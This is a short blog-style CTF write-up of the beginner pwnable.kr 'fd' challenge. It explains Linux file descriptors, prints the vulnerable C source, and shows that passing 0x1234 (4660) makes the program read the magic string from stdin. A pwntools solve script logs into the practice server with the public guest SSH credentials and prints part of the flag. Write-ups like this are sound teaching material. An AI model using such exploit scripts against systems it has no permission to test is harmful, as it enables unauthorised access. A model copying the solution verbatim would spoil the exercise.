+++
date = '2025-12-13T19:01:54+02:00'
draft = false
title = 'Fd'
+++
### Fd

this is the first ctf on baby bottle in pwn college, the challenge description says it's about file descriptors in linux,
lets try it

### source code analysis :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		setregid(getegid(), getegid());
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```
we need to get the flag that is our goal , we need to pass an arguement and also we have a buffer of [32] byte chars. 
file descriptors in linux is the hint here so lets research about them,
	len = read(fd, buf, 32);
we dont see anyway to read actually into the buffer directly however, we do have the power to change the value of fd into our desired file descriptor,

| FD # | Name | Constant (`<unistd.h>`) | Default Connection |
| :--- | :--- | :--- | :--- |
| **0** | **stdin** | `STDIN_FILENO` | Keyboard (Input) |
| **1** | **stdout** | `STDOUT_FILENO` | Screen (Output) |
| **2** | **stderr** | `STDERR_FILENO` | Screen (Error Logs) |

this is a cheathseet for file descriptors
so my theory is that if we change fd to 0 using the right input then we'll be able to read directly our input into the buffer and then get the flag
if we give an input of 0x1234 then we'll have an fd of 0 and then we can read from std input into the buffer , or using pwntools:

```python
from pwn import *

#connect to fd binary

s = ssh(user='fd',host='pwnable.kr',port=2222,password='guest')
p=s.process(['./fd','4660']) #4660 =0x1234 (converted)
p.sendline(b"LETMEWIN") #we can now input from our kb the actualy pass
p.interactive()
# print whatever comes back (the flag)
print(p.recvall().decode())

#pwnable.kr servers r kinda laggy
s.close()
```
Mama! Now_I_understand_*** ... flag
1 point received